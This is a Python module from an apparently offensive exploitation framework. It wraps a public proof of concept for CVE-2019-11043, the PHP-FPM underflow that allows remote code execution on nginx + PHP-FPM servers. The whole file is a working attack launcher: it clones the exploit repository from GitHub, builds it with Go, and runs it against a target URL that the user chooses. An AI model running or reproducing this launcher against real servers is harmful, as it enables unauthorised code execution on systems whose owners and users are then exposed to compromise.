"""CVE-2019-11043 — PHP-FPM env_path_info underflow (nginx + PHP-FPM).
Обёртка над neex/phuip-fpizdam.
Требования: git, go (golang).
"""
from pathlib import Path

from framework import Module, C, require
from poc_support import ensure_repo, run_checked

REPO = "https://github.com/neex/phuip-fpizdam.git"
WORK = Path.home() / ".rce-tool" / "phuip-fpizdam"


class CVE201911043(Module):
    name = "cve_2019_11043"
    description = "PHP-FPM underflow RCE (nginx + PHP-FPM, neex PoC)"
    author = "you"

    options = {
        "TARGET": {
            "value": None, "required": True, "kind": "url",
            "description": "Target URL, e.g. http://10.10.10.5/index.php",
        },
    }

    def run(self):
        if require("go"):
            raise RuntimeError("Go not found; install Go to build this PoC")
        ensure_repo(REPO, WORK, "main.go")
        target = self.get("TARGET")
        cmd = ["go", "run", ".", target]
        print(f"{C.Y}[*] Running PHP-FPM PoC{C.END}")
        run_checked(cmd, cwd=WORK)
        print(f"{C.DIM}[*] PoC exited successfully; review its output.{C.END}")
